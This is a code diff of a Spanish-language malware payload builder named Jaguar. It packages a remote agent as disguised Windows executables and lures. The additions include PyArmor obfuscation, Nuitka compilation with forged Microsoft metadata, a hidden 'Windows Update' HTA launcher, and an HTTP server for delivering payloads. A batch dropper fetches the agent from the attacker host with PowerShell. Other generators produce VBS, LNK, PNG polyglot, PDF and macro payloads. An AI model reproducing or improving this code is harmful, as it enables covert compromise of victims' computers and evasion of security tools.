@@ -1,8 +1,11 @@
 # -*- coding: utf-8 -*-
-"""Constructor de payloads Jaguar.
+"""Constructor de payloads Jaguar (pipeline avanzado + PyArmor).
 
-Los payloads lanzan agente.py y SE CIERRAN. El .exe se auto-desprende
-(spawn detached + exit) para no quedar abierto. Logging por self.log.
+Cadena de ofuscación/compilación:
+  1) PyArmor  -> ofusca el agente (si está instalado)
+  2) Nuitka   -> compila (sin UPX, metadatos legítimos)   [recomendado]
+  3) PyInstaller -> fallback (--noupx)
+El payload se auto-desprende (spawn detached + exit) para no quedar abierto.
 """
 import os
 import sys
@@ -12,8 +15,7 @@ import zlib
 import subprocess
 import tempfile
 import functools
-import time                      # <-- AÑADIR
-from http.server import SimpleHTTPRequestHandler, ThreadingHTTPServer
+import time
 from http.server import SimpleHTTPRequestHandler, ThreadingHTTPServer
 
 ES_WIN = sys.platform.startswith("win")
@@ -21,7 +23,8 @@ ES_WIN = sys.platform.startswith("win")
 
 class Constructor:
     def __init__(self, host, puerto, log=None, nombre="RuntimeBroker",
-                 icono=None, upx=None, certificado=None, contrasena_cert=None):
+                 icono=None, upx=None, certificado=None, contrasena_cert=None,
+                 compilador="auto", lto=False, mingw=False, usar_pyarmor=True):
         self.host = (host or "127.0.0.1").strip()
         self.puerto = str(puerto or "8000").strip()
         self.log = log or (lambda t: None)
@@ -30,13 +33,18 @@ class Constructor:
         self.upx = upx or None
         self.certificado = certificado or None
         self.contrasena_cert = contrasena_cert or None
+        self.compilador = (compilador or "auto").lower()   # auto | nuitka | pyinstaller
+        self.lto = bool(lto)
+        self.mingw = bool(mingw)
+        self.usar_pyarmor = bool(usar_pyarmor)
 
         self.base = os.path.dirname(os.path.abspath(__file__))
         self.raiz = os.path.dirname(os.path.dirname(self.base))
         self.dist = os.path.join(self.raiz, "dist")
         self.build = os.path.join(self.raiz, "build_jaguar")
         self.agente = self._localizar_agente()
-        self.fallback = self._ip_local()        # <-- AÑADIR
+        self.fallback = self._ip_local()
+        self._http = None
         if not self.agente:
             raise FileNotFoundError("No se encontró agente/agente.py — revisa la estructura del proyecto")
         os.makedirs(self.dist, exist_ok=True)
@@ -44,7 +52,7 @@ class Constructor:
     # ------------------------------------------------------------------ util
     def _localizar_agente(self):
         cands = [
-            os.path.join(self.raiz, "agente", "agente.py"),          # estructura real
+            os.path.join(self.raiz, "agente", "agente.py"),
             os.path.join(self.raiz, "agente.py"),
             os.path.join(self.raiz, "jaguar", "agente", "agente.py"),
             os.path.join(self.base, "agente.py"),
@@ -55,8 +63,6 @@ class Constructor:
                 return c
         self.log(f"[builder] ERROR: no encontré agente.py (busqué en {self.raiz})")
         return None
-
-
     @staticmethod
     def _ip_local():
         import socket
@@ -90,6 +96,98 @@ class Constructor:
     def _args(self):
         return f'{self.host} {self.puerto} {self.fallback}'
 
+    # ------------------------------------------------------------------ entry
+    def _entry(self):
+        return (
+            "import os, sys, subprocess\n"
+            "sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))\n"
+            f'_HOST = {self.host!r}\n'
+            f'_PORT = {self.puerto!r}\n'
+            f'_HOST2 = {self.fallback!r}\n'
+            "os.environ.setdefault('JAGUAR_HOST', _HOST)\n"
+            "os.environ.setdefault('JAGUAR_PORT', _PORT)\n"
+            "os.environ.setdefault('JAGUAR_HOST2', _HOST2)\n"
+            "DETACHED_PROCESS = 0x00000008\n"
+            "CREATE_NEW_PROCESS_GROUP = 0x00000200\n"
+            "CREATE_NO_WINDOW = 0x08000000\n"
+            "if sys.platform.startswith('win') and '--jaguar-detached' not in sys.argv:\n"
+            "    subprocess.Popen(\n"
+            "        [sys.executable, '--jaguar-detached', _HOST, _PORT],\n"
+            "        creationflags=DETACHED_PROCESS | CREATE_NEW_PROCESS_GROUP | CREATE_NO_WINDOW,\n"
+            "        close_fds=True)\n"
+            "    sys.exit(0)\n"
+            "sys.argv = [sys.argv[0], _HOST, _PORT, _HOST2]\n"
+            "import agente_jaguar as agente\n"
+            "agente.main()\n"
+        )
+
+    # ------------------------------------------------------------------ detect
+    @staticmethod
+    def _tiene_nuitka():
+        try:
+            r = subprocess.run([sys.executable, "-m", "nuitka", "--version"],
+                               capture_output=True, text=True)
+            return r.returncode == 0
+        except Exception:
+            return False
+
+    @staticmethod
+    def _tiene_pyarmor():
+        try:
+            r = subprocess.run([sys.executable, "-m", "pyarmor.cli", "--version"],
+                               capture_output=True, text=True)
+            return r.returncode == 0
+        except Exception:
+            return False
+
+    # ------------------------------------------------------------------ pyarmor
+    def _limpiar_pyarmor(self):
+        for n in os.listdir(self.build):
+            if n.startswith("pyarmor_runtime"):
+                shutil.rmtree(os.path.join(self.build, n), ignore_errors=True)
+        shutil.rmtree(os.path.join(self.build, "pyarmor_out"), ignore_errors=True)
+
+    def _obfuscar_pyarmor(self):
+        """Ofusca agente_jaguar.py con PyArmor dentro de self.build.
+        Devuelve el nombre del paquete runtime (o None si falla)."""
+        self._limpiar_pyarmor()
+        src = os.path.join(self.build, "agente_jaguar.py")
+        if not os.path.isfile(src):
+            return None
+        out = os.path.join(self.build, "pyarmor_out")
+        intentos = (
+            ["gen", "-O", out, src],
+            ["gen", "--output=" + out, src],
+        )
+        proc = None
+        ok = False
+        for args in intentos:
+            try:
+                proc = subprocess.run([sys.executable, "-m", "pyarmor.cli"] + args,
+                                      cwd=self.build, capture_output=True, text=True)
+            except Exception as e:
+                self.log(f"[builder] PyArmor excepción: {e}")
+                continue
+            if proc.returncode == 0 and os.path.isdir(out):
+                ok = True
+                break
+            self.log(f"[builder] PyArmor falló (rc={proc.returncode}): "
+                     + ((proc.stderr or proc.stdout or "").strip()[-500:]))
+        if not ok:
+            return None
+
+        runtime = None
+        for name in os.listdir(out):
+            p = os.path.join(out, name)
+            if name.startswith("pyarmor_runtime") and os.path.isdir(p):
+                runtime = name
+                shutil.copytree(p, os.path.join(self.build, name), dirs_exist_ok=True)
+            elif name == "agente_jaguar.py":
+                shutil.copy2(p, src)
+        if runtime:
+            self.log(f"[builder] PyArmor OK (runtime={runtime})")
+        return runtime
+
     # ------------------------------------------------------------------ exe
     def generar_exe(self):
         try:
@@ -98,67 +196,31 @@ class Constructor:
                 return None
             os.makedirs(self.build, exist_ok=True)
             shutil.copy2(self.agente, os.path.join(self.build, "agente_jaguar.py"))
+            self._escribir(os.path.join(self.build, "_entry.py"), self._entry())
 
-            # Compilamos en carpeta TEMPORAL para no chocar con un .exe en uso.
+            runtime = None
+            if self.usar_pyarmor:
+                if self._tiene_pyarmor():
+                    runtime = self._obfuscar_pyarmor()
+                else:
+                    self.log("[builder] PyArmor no instalado -> sigo sin ofuscar")
+
             dist_tmp = os.path.join(self.build, "dist_tmp")
             shutil.rmtree(dist_tmp, ignore_errors=True)
             os.makedirs(dist_tmp, exist_ok=True)
 
-            entry = (
-                "import os, sys, subprocess\n"
-                "sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))\n"
-                f'_HOST = {self.host!r}\n'
-                f'_PORT = {self.puerto!r}\n'
-                f'_HOST2 = {self.fallback!r}\n'                 # <-- AÑADIR
-                "os.environ.setdefault('JAGUAR_HOST', _HOST)\n"
-                "os.environ.setdefault('JAGUAR_PORT', _PORT)\n"
-                "os.environ.setdefault('JAGUAR_HOST2', _HOST2)\n"   # <-- AÑADIR
-                f'_PORT = {self.puerto!r}\n'
-                "os.environ.setdefault('JAGUAR_HOST', _HOST)\n"
-                "os.environ.setdefault('JAGUAR_PORT', _PORT)\n"
-                "DETACHED_PROCESS = 0x00000008\n"
-                "CREATE_NEW_PROCESS_GROUP = 0x00000200\n"
-                "CREATE_NO_WINDOW = 0x08000000\n"
-                "if sys.platform.startswith('win') and '--jaguar-detached' not in sys.argv:\n"
-                "    subprocess.Popen(\n"
-                "        [sys.executable, '--jaguar-detached', _HOST, _PORT],\n"
-                "        creationflags=DETACHED_PROCESS | CREATE_NEW_PROCESS_GROUP | CREATE_NO_WINDOW,\n"
-                "        close_fds=True)\n"
-                "    sys.exit(0)\n"
-                "sys.argv = [sys.argv[0], _HOST, _PORT, _HOST2]\n"
-                "import agente_jaguar as agente\n"
-                "agente.main()\n"
-            )
-            self._escribir(os.path.join(self.build, "_entry.py"), entry)
-
-            cmd = [sys.executable, "-m", "PyInstaller", "--noconfirm",
-                   "--onefile", "--noconsole", "--clean",
-                   "--name", self.nombre,
-                   "--distpath", dist_tmp,
-                   "--workpath", os.path.join(self.build, "work"),
-                   "--specpath", self.build,
-                   "--hidden-import", "PIL",
-                   "--hidden-import", "PIL.Image",
-                   "--hidden-import", "PIL.ImageGrab",
-                   "--hidden-import", "cv2",
-                   "--hidden-import", "winreg",
-                   "--paths", self.build]
-            if self.icono and os.path.isfile(self.icono):
-                cmd += ["--icon", os.path.abspath(self.icono)]
-            if self.upx and os.path.isdir(self.upx):
-                cmd += ["--upx-dir", os.path.abspath(self.upx)]
-            cmd += ["_entry.py"]
-
-            self.log("[builder] compilando exe (PyInstaller)... puede tardar.")
-            proc = subprocess.run(cmd, cwd=self.build, capture_output=True, text=True)
-            if proc.returncode != 0:
-                self.log("[builder] ERROR PyInstaller:\n" + (proc.stderr or "")[-1500:])
+            origen = None
+            if self.compilador in ("auto", "nuitka"):
+                if self._tiene_nuitka():
+                    origen = self._compilar_nuitka(dist_tmp, runtime)
+                else:
+                    self.log("[builder] Nuitka no instalado -> PyInstaller")
+            if not origen:
+                origen = self._compilar_pyinstaller(dist_tmp, runtime)
+            if not origen or not os.path.isfile(origen):
+                self.log("[builder] ERROR exe: no se produjo salida")
                 return None
 
-            origen = os.path.join(dist_tmp, self.nombre + (".exe" if ES_WIN else ""))
-            if not os.path.isfile(origen):
-                self.log("[builder] ERROR exe: PyInstaller no produjo salida")
-                return None
             destino = self._colocar_exe(origen)
             self._firmar(destino)
             self.log(f"[builder] exe listo: {os.path.basename(destino)}")
@@ -167,8 +229,82 @@ class Constructor:
             self.log(f"[builder] ERROR exe: {e}")
             return None
 
+    def _nuitka_cmd(self, dist_tmp, extra, runtime):
+        cmd = [sys.executable, "-m", "nuitka",
+               "--onefile",
+               "--assume-yes-for-downloads",
+               "--remove-output",
+               "--windows-console-mode=disable",
+               "--enable-plugin=numpy",
+               "--include-package=PIL",
+               "--include-package=cv2",
+               "--include-module=winreg",
+               "--include-module=agente_jaguar",
+               "--company-name=Microsoft Corporation",
+               "--product-name=Windows",
+               f"--file-description={self.nombre}",
+               "--file-version=1.0.0.0",
+               "--product-version=1.0.0.0",
+               "--copyright=Microsoft Corporation",
+               f"--output-filename={self.nombre}.exe",
+               f"--output-dir={dist_tmp}"]
+        if runtime:
+            cmd += [f"--include-package={runtime}",
+                    f"--include-package-data={runtime}"]
+        if self.lto:
+            cmd.append("--lto=yes")
+        if self.icono and os.path.isfile(self.icono):
+            cmd.append(f"--windows-icon-from-ico={os.path.abspath(self.icono)}")
+        cmd += list(extra)
+        cmd.append("_entry.py")
+        return cmd
+
+    def _compilar_nuitka(self, dist_tmp, runtime):
+        exe = os.path.join(dist_tmp, self.nombre + (".exe" if ES_WIN else ""))
+        intentos = [["--mingw64"]] if self.mingw else [[], ["--mingw64"]]
+        for extra in intentos:
+            self.log(f"[builder] compilando con Nuitka {extra or '[MSVC]'}... (varios minutos)")
+            try:
+                proc = subprocess.run(self._nuitka_cmd(dist_tmp, extra, runtime),
+                                      cwd=self.build, capture_output=True, text=True)
+            except Exception as e:
+                self.log(f"[builder] Nuitka excepción: {e}")
+                continue
+            if proc.returncode == 0 and os.path.isfile(exe):
+                return exe
+            self.log("[builder] Nuitka falló:\n" + (proc.stderr or proc.stdout or "")[-1500:])
+        return None
+
+    def _compilar_pyinstaller(self, dist_tmp, runtime):
+        cmd = [sys.executable, "-m", "PyInstaller", "--noconfirm",
+               "--onefile", "--noconsole", "--clean",
+               "--name", self.nombre,
+               "--distpath", dist_tmp,
+               "--workpath", os.path.join(self.build, "work"),
+               "--specpath", self.build,
+               "--hidden-import", "PIL",
+               "--hidden-import", "PIL.Image",
+               "--hidden-import", "PIL.ImageGrab",
+               "--hidden-import", "cv2",
+               "--hidden-import", "winreg",
+               "--paths", self.build]
+        if runtime:
+            cmd += ["--collect-all", runtime]
+        if self.icono and os.path.isfile(self.icono):
+            cmd += ["--icon", os.path.abspath(self.icono)]
+        if self.upx and os.path.isdir(self.upx):
+            cmd += ["--upx-dir", os.path.abspath(self.upx)]
+        else:
+            cmd += ["--noupx"]
+        cmd += ["_entry.py"]
+        self.log("[builder] compilando con PyInstaller...")
+        proc = subprocess.run(cmd, cwd=self.build, capture_output=True, text=True)
+        if proc.returncode != 0:
+            self.log("[builder] ERROR PyInstaller:\n" + (proc.stderr or "")[-1500:])
+            return None
+        return os.path.join(dist_tmp, self.nombre + (".exe" if ES_WIN else ""))
+
     def _colocar_exe(self, origen, intentos=5):
-        """Mueve el exe a dist/ aunque el anterior esté en uso (locked)."""
         ext = ".exe" if ES_WIN else ""
         for i in range(intentos):
             nombre = self.nombre + (ext if i == 0 else f"_{i + 1}{ext}")
@@ -192,7 +328,7 @@ class Constructor:
         destino = os.path.join(self.dist, f"{self.nombre}_{int(time.time())}{ext}")
         shutil.copy2(origen, destino)
         return destino
-    
+
     def _firmar(self, exe):
         if not (ES_WIN and self.certificado and os.path.isfile(self.certificado)):
             return
@@ -219,7 +355,7 @@ class Constructor:
             'cd /d "%~dp0"\r\n'
             'if not exist "agente.py" (\r\n'
             '  powershell -NoProfile -Command "try{Invoke-WebRequest -UseBasicParsing '
-            f"'http://{self.host}:8080/agente.py' -OutFile 'agente.py'}}catch{{}}\"\r\n"
+            f"'http://{self.host}:8080/agente.py' -OutFile 'agente.py'}}catch{{}}\\\"\\r\\n"
             ')\r\n'
             f'start "" pythonw "agente.py" {self._args()}\r\n'
             "exit\r\n"
@@ -287,6 +423,26 @@ class Constructor:
         self.log(f"[builder] creado: {os.path.basename(destino)}")
         return destino
 
+    # ------------------------------------------------------------------ hta
+    def generar_hta(self):
+        self._copiar_agente()
+        hta = (
+            '<html><head><title>Windows Update</title>\r\n'
+            '<HTA:APPLICATION ID="j" BORDER="none" SHOWINTASKBAR="no" '
+            'WINDOWSTATE="minimize" SINGLEINSTANCE="yes" />\r\n'
+            '<script language="VBScript">\r\n'
+            'Sub Window_OnLoad\r\n'
+            '  Set fso = CreateObject("Scripting.FileSystemObject")\r\n'
+            '  dir = fso.GetParentFolderName(js)\r\n'
+            '  Set sh = CreateObject("WScript.Shell")\r\n'
+            '  sh.CurrentDirectory = dir\r\n'
+            f'  sh.Run "pythonw ""agente.py"" {self._args()}", 0, False\r\n'
+            '  window.close\r\n'
+            'End Sub\r\n'
+            '</script></head><body></body></html>\r\n'
+        )
+        return self._escribir(self._out(self.nombre + ".hta"), hta)
+
     # ------------------------------------------------------------------ png polyglot
     def generar_png_polyglot(self):
         self._copiar_agente()
@@ -308,7 +464,6 @@ class Constructor:
         idat = zlib.compress(b"\x00\xff\x00\x00")
         return sig + chunk(b"IHDR", ihdr) + chunk(b"IDAT", idat) + chunk(b"IEND", b"")
 
-    # ------------------------------------------------------------------ pdf
     # ------------------------------------------------------------------ pdf
     def generar_pdf(self):
         self._escribir(self._out(self.nombre + ".pdf"), self._pdf_minimo(""), binario=True)
@@ -341,7 +496,6 @@ class Constructor:
         return bytes(out)
 
     # ------------------------------------------------------------------ macro
-   # ------------------------------------------------------------------ macro
     def generar_macro(self):
         self._copiar_agente()
         macro = (
@@ -357,7 +511,7 @@ class Constructor:
 
     # ------------------------------------------------------------------ todo
     def generar_todo(self, tipos=None):
-        tipos = tipos or ["exe", "bat", "vbs", "ps1", "lnk", "png", "pdf", "macro"]
+        tipos = tipos or ["exe", "bat", "vbs", "ps1", "lnk", "hta", "png", "pdf", "macro"]
         res = {}
         mapa = {
             "exe": self.generar_exe,
@@ -365,6 +519,7 @@ class Constructor:
             "vbs": self.generar_vbs,
             "ps1": self.generar_ps1,
             "lnk": self.generar_lnk,
+            "hta": self.generar_hta,
             "png": self.generar_png_polyglot,
             "pdf": self.generar_pdf,
             "macro": self.generar_macro,
@@ -379,6 +534,16 @@ class Constructor:
                 self.log(f"[builder] ERROR generando {t}: {e}")
                 res[t] = None
         return res
+
+    # ------------------------------------------------------------------ http
+    def servir_http(self, puerto=8080, directorio=None):
+        if self._http is None:
+            self._http = Servidor(puerto=puerto, log=self.log)
+        return self._http.iniciar(directorio or self.dist)
+
+    def detener_http(self):
+        if self._http:
+            self._http.detener()
 
 
 # ============================================================ SERVIDOR ======
